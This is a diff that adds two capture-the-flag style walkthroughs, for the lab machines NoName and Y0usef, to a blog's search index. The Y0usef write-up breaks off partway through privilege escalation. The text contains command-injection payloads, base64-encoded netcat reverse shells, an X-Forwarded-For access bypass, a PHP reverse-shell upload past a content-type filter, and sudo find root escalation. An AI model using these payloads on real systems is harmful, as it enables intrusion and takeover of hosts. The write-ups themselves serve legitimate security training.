@@ -466,6 +466,87 @@
       </tags>
   </entry>
   <entry>
+    <title>NoName</title>
+    <url>/undefined/NoName/</url>
+    <content><![CDATA[<h1 id="Exploitation-Guide-for-NoName"><a href="#Exploitation-Guide-for-NoName" class="headerlink" title="Exploitation Guide for NoName"></a><strong>Exploitation Guide for NoName</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h3><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We initiate our enumeration process by running an <code>nmap</code> scan against our target to identify any open ports. After that, we immediately launch another scan adding in the <code>-A</code> argument for further service enumeration of the discovered ports.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:25 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 80 -A 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:26 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the default web page on port 80 (<a href="http://192.168.54.15/">http://192.168.54.15/</a>), we identify a decoy masquerading as a system command execution utility.</p>
+<p>After brute-forcing the website with <code>GoBuster</code>, we discover additional directories:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ locate common.txt</span><br><span class="line">...</span><br><span class="line">/usr/lib/python3/dist-packages/mercurial/helptext/common.txt</span><br><span class="line">/usr/share/dirb/wordlists/common.txt</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -w /usr/share/dirb/wordlists/common.txt —url http://192.168.249.15</span><br><span class="line">...</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/admin (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Image-Steganography"><a href="#Image-Steganography" class="headerlink" title="Image Steganography"></a><strong>Image Steganography</strong></h3><p>Navigating to that directory (<a href="http://192.168.120.68/admin">http://192.168.120.68/admin</a>), we are met with <code>HacLabs directory of gallery.</code>, followed by four images: <strong>ctf-01.jpg</strong>, <strong>haclabs.jpeg</strong>, <strong>new.jpg</strong>, and <strong>Short.png</strong>. We will download all the images for further analysis.</p>
+<p>If we look at line 60 in the source code of the default file in the <em>/admin</em> directory, we will find the following commented out text:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!—passphrase:harder—&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will Install <code>steghide</code> to assist in retrieving any information hidden away in the images.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo apt-get install steghide -y</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now that we have the images and the passphrase <code>harder</code>, we can use <code>steghide</code> to reveal hidden information inside the images. By analysing the image <strong>haclabs.jpeg</strong> and providing the passphrase, we discover a new file <strong>superadmin.php</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ steghide extract -sf haclabs.jpeg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt</span><br><span class="line">c3VwZXJhZG1pbi5waHA=</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt | base64 -d</span><br><span class="line">superadmin.phpkali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Command-Injection-Vulnerability"><a href="#Command-Injection-Vulnerability" class="headerlink" title="Command Injection Vulnerability"></a><strong>Command Injection Vulnerability</strong></h3><p>Navigating to <a href="http://192.168.54.15/superadmin.php">http://192.168.54.15/superadmin.php</a>, we are met with an “Enter an IP to ping” text box. We can clearly see that we have some command execution on the target after entering the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We observe the desired output:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>However, getting a reverse shell right away does not seem to be working. This is probably caused by a basic input filter setup in the application. We can extract the server-side code into a base64 format and then decode it on our Kali machine. Let’s enter:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | cat superadmin.php |  base64</span><br></pre></td></tr></table></figure>
+
+<p>We can see that the source code of the page is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   if (isset($_POST[&#x27;submitt&#x27;]))&#123;   	$word=array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);   	$pinged=$_POST[&#x27;pinger&#x27;];   	$newStr = str_replace($word, &quot;&quot;, $pinged);   	if(strcmp($pinged, $newStr) == 0)		&#123;		    $flag=1;		&#125;       else		&#123;		   $flag=0;		&#125;&#125;if ($flag==1)&#123;$outer=shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;&lt;pre&gt;$outer&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>We can bypass the filtering put in place by creating a <strong>bash</strong> reverse shell and encoding it in base64. We can use the following shell for this purpose:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2&gt;&amp;1|nc 192.168.49.249 80 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>Let’s save it to a file named <strong>rev.txt</strong>. We need to base64-encode it before pasting into the textbox:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat rev.txt| base64cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo=</span><br></pre></td></tr></table></figure>
+
+<p>We will set up a netcat listener on our Kali machine on port 80, and then deliver our payload to the vulnerable web application with the following command:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo= | base64 -d | bash</span><br></pre></td></tr></table></figure>
+
+<p>Our reverse shell will be available on our netcat listener once the command has been executed on the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -lvp 80listening on [any] 80 ...192.168.249.15: inverse host lookup failed: Unknown hostconnect to [192.168.49.249] from (UNKNOWN) [192.168.249.15] 35286/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@haclabs:/var/www/html$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Recovering-Hidden-Credentials"><a href="#Recovering-Hidden-Credentials" class="headerlink" title="Recovering Hidden Credentials"></a><strong>Recovering Hidden Credentials</strong></h3><p>The contents of the file <strong>flag1.txt</strong> in the home directory of <code>yash</code> suggests that there is a hidden file on the system that contains the needed credentials to continue.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/var/www/html$ cd /home/yash &amp;&amp; ls -lacd /home/yash &amp;&amp; ls -latotal 32drwxr-xr-x 5 yash yash 4096 Feb 15 16:28 .drwxr-xr-x 4 root root 4096 Jan 27 20:32 ..-rw------- 1 yash yash    0 Mar 14 00:52 .bash_history-rw-r--r-- 1 yash yash 3771 Jan 27 20:32 .bashrcdrwx------ 2 yash yash 4096 Feb  9 18:06 .cachedrwx------ 3 yash yash 4096 Jan 27 20:33 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 27 20:35 .local-rw-r--r-- 1 yash yash  807 Jan 27 20:32 .profile-rw-rw-r-- 1 yash yash   77 Jan 30 03:56 flag1.txtwww-data@haclabs:/home/yash$www-data@haclabs:/home/yash$ cat flag1.txtcat flag1.txtDue to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure>
+
+<p>Running the <strong>find</strong> command for all files owned by <code>yash</code> reveals the location of the hidden file to be <strong>/usr/share/hidden/.passwd</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ find / -type f -user yash 2&gt;/dev/nullfind / -type f -user yash 2&gt;/dev/null/home/yash/flag1.txt/home/yash/.bashrc/home/yash/.cache/motd.legal-displayed/home/yash/.profile/home/yash/.bash_history/usr/share/hidden/.passwd</span><br></pre></td></tr></table></figure>
+
+<p>Inside the file, we find the needed credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ cat /usr/share/hidden/.passwdcat /usr/share/hidden/.passwdhaclabs1234</span><br></pre></td></tr></table></figure>
+
+<p>We have the password for the user <code>haclabs</code>. From this point, we can simply <code>su</code> into the account:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ su haclabssu haclabsPassword: haclabs1234haclabs@haclabs:/home/yash$</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a><strong>Sudo</strong></h3><p>Once we are authenticated as the user <code>haclabs</code>, we run <code>sudo -l</code> to determine that we can run <strong>find</strong> with elevated privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo -lsudo -lMatching Defaults entries for haclabs on haclabs:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser haclabs may run the following commands on haclabs:    (root) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>We can spawn a root shell by running <strong>find</strong> via sudo and utilising its ability to spawn a shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo find . -exec /bin/sh \; -quit# ididuid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>Focus：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | ‘<span class="built_in">echo</span> <span class="string">&quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDc3ODg=&quot;</span> | base64 -d ’</span><br></pre></td></tr></table></figure>
+
+<p>注意echo前后的中文引号（非英文引号）</p>
+<p>base64编码解码在线网站：<a href="https://www.base64encode.org/">https://www.base64encode.org/</a></p>
+]]></content>
+      <categories>
+        <category>Linux Walkthrough</category>
+      </categories>
+      <tags>
+        <tag>Reverse Shell</tag>
+        <tag>Steganography</tag>
+        <tag>Injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pwned1</title>
     <url>/undefined/Pwned1/</url>
     <content><![CDATA[<h1 id="Exploitation-Guide-for-Pwned1"><a href="#Exploitation-Guide-for-Pwned1" class="headerlink" title="Exploitation Guide for Pwned1"></a><strong>Exploitation Guide for Pwned1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
@@ -796,6 +877,115 @@
         <tag>Mysql</tag>
         <tag>Gobuster</tag>
         <tag>Script</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Y0usef</title>
+    <url>/undefined/Y0usef/</url>
+    <content><![CDATA[<h1 id="Y0usef"><a href="#Y0usef" class="headerlink" title="Y0usef"></a>Y0usef</h1><h1 id="Exploitation-Guide-for-Y0usef"><a href="#Exploitation-Guide-for-Y0usef" class="headerlink" title="Exploitation Guide for Y0usef"></a><strong>Exploitation Guide for Y0usef</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filtering by the application. We’ll be able to escalate our privileges on the target by either recovering a user’s credentials, who has unlimited sudo rights, or exploiting the operating system’s very old kernel version via the <em>overlayfs</em> local privilege escalation exploit.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with an <code>nmap</code> scan.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap 192.168.120.65</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 09:17 EDT</span><br><span class="line">Nmap scan report for 192.168.120.65</span><br><span class="line">Host is up (0.030s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="GoBuster"><a href="#GoBuster" class="headerlink" title="GoBuster"></a><strong>GoBuster</strong></h3><p>Navigating to the website on port 80 does not give us anything useful. The site appears to be under construction.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container-fluid&quot;&gt;</span><br><span class="line">&lt;center class=&quot;mt-5&quot;&gt;</span><br><span class="line">&lt;h1&gt;Sorry , the site is under construction soon, it run &lt;/h1&gt;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Next, let’s try employing <code>gobuster</code> to brute-force the site’s directories. We’ll start with a smaller wordlist <strong>/usr/share/wordlists/dirb/small.txt</strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ gobuster dir -u http://192.168.120.65/ -w /usr/share/wordlists/dirb/small.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.120.65/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/small.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:05 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/administration       (Status: 301) [Size: 325] [--&gt; http://192.168.120.65/administration/]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:08 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Our scan gets a 301 response in the directory <strong>/administration</strong>.</p>
+<h3 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a><strong>HTTP Enumeration</strong></h3><p>Navigating to the discovered directory (<a href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>), we are met with a 403-Forbidden error code.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65/administration/</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&#x27;t have permission to access on this folder&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately, the server shows no indication why exactly it gave us the 403 error code.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Host-Header-Injection-Vulnerability"><a href="#Host-Header-Injection-Vulnerability" class="headerlink" title="Host Header Injection Vulnerability"></a><strong>Host Header Injection Vulnerability</strong></h3><p>To investigate this further, we’ll set up our browser to use Burp proxy and intercept this request.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>As expected, we get the 403 code back from the server.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 403 Forbidden</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Because this is probably an administrative interface (judging by the name of it), we can deduce that it might not like where our request is coming from (i.e. our IP address). Many admin panels and interfaces only grant access to the traffic from localhost. Let’s send our request to the <em>Repeater</em> and see if we can find a way to bypass this obstacle.</p>
+<p>If a server is vulnerable to such trickery, a common way to bypass this restriction is to add the <code>X-Forwarded-For</code> HTTP header and set it to the localhost address:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Let’s try this. Our complete request will look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After we send this request to the server, we get back a <code>200 OK</code> and are presented with a web page!</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OKDate: Fri, 02 Apr 2021 13:40:20 GMTServer: Apache/2.4.10 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.29Set-Cookie: PHPSESSID=oq4shm2bghmpf9mqvdrpafvns6; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheVary: Accept-EncodingContent-Length: 926Connection: closeContent-Type: text/html&lt;html&gt;&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;...</span><br></pre></td></tr></table></figure>
+
+<p>Nice, we have made some progress. Let’s add this header to our proxy session permanently. To do that, we’ll navigate to <em>Proxy</em> -&gt; <em>Options</em>, then scroll down to <em>Match and Replace</em>, and add our new header there.</p>
+<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png"></p>
+<p>Now if we refresh our browser at <a href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>, we are presented with a login control.</p>
+<h3 id="Application-Credential-Guessing"><a href="#Application-Credential-Guessing" class="headerlink" title="Application Credential Guessing"></a><strong>Application Credential Guessing</strong></h3><p>Before we start brute-forcing the login control, let’s try guessing some default credentials. One of the first ones we’ll try is <code>admin:admin</code>, and it works! We are now successfully authenticated and redirected to <a href="http://192.168.120.65/administration/dashborad/">http://192.168.120.65/administration/dashborad/</a>.</p>
+<h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>In the left-side navigation menu, we see a link to <em>Upload file</em>. File upload functionality is always interesting to explore as it can oftentimes contain vulnerabilities. Navigating there (<a href="http://192.168.120.65/administration/upload/">http://192.168.120.65/administration/upload/</a>), we are indeed presented with a file upload control.</p>
+<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png"></p>
+<p>Let’s try uploading a PHP reverse shell. We’ll copy it to our directory and replace the IP address and port number on lines 49 and 50 as needed.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ip = &#x27;192.168.118.5&#x27;;  // CHANGE THIS$port = 4444;       // CHANGE THIS</span><br></pre></td></tr></table></figure>
+
+<p>However, clicking the <em>Send</em> button displays the following error at the very top of the web page:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file not allow</span><br></pre></td></tr></table></figure>
+
+<p>Looks like PHP files are blacklisted. Let’s see if the application is only checking file type during the upload and not file content itself. To do that, we’ll set our Burp proxy to intercept the request before uploading the shell file again. Once the intercept is enabled, we’ll select our shell and click <em>Send</em>. While the page is hanging, we’ll inspect the intercepted request.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /administration/upload/ HTTP/1.1Host: 192.168.120.65User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------130540507737268991721537520459Content-Length: 5839Origin: http://192.168.120.65Connection: closeReferer: http://192.168.120.65/administration/upload/Cookie: PHPSESSID=nsh0gp8fi31pf9rkhf1rg4sn91Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: application/x-php&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net...</span><br></pre></td></tr></table></figure>
+
+<p>To test our theory, we’ll modify the <code>Content-Type</code> parameter to <code>image/png</code>. The modified request would look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: image/png...</span><br></pre></td></tr></table></figure>
+
+<p>We’ll now forward this request to the server. Now at the top of the page, we see the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file uploadad files/1617375016shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Nice, it looks like our shell has been successfully uploaded, and the server responded with its location. Let’s start a Netcat listener on port 4444. Once our listener is running, we’ll trigger the reverse shell by navigating to the URL provided by the server, appending it to the current <strong>/upload/</strong> directory.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ curl http://192.168.120.65/administration/upload/files/1617375016shell.php...</span><br></pre></td></tr></table></figure>
+
+<p>Our listener reports that we have received a reverse shell connection as the <code>www-data</code> user.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ nc -lvp 4444listening on [any] 4444 ...192.168.120.65: inverse host lookup failed: Unknown hostconnect to [192.168.118.5] from (UNKNOWN) [192.168.120.65] 54728Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux 17:55:39 up  2:10,  0 users,  load average: 0.00, 0.01, 0.05USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>There are a couple of different vectors we can use to escalate our privileges on the target. The first vector involves recovering user credentials, and the second one involves exploiting a kernel vulnerability.</p>
+<h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Looking around the file system, we find an interesting file <strong>user.txt</strong> in the home directory.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls -l /hometotal 8-rw-r--r--  1 root   root     53 Dec  8 02:14 user.txtdrwxr-xr-x 18 yousef yousef 4096 Apr  1 17:24 yousef</span><br></pre></td></tr></table></figure>
+
+<p>Looking inside the file, we find what looks to be a base64-encoded string.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /home/user.txtc3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to decode this string.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /home/user.txt | base64 -dssh :user : yousefpass : yousef123</span><br></pre></td></tr></table></figure>
+
+<p>We find credentials for user <code>yousef</code>, with which we should be able to SSH to the target.</p>
+<p>Additionally, checking the kernel version reveals that this is a very old operating system.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uname -r3.13.0-24-generic</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escalation-via-User-Credentials"><a href="#Escalation-via-User-Credentials" class="headerlink" title="Escalation via User Credentials"></a><strong>Escalation via User Credentials</strong></h3><p>Using the discovered user credentials, we can SSH to the target.</p>
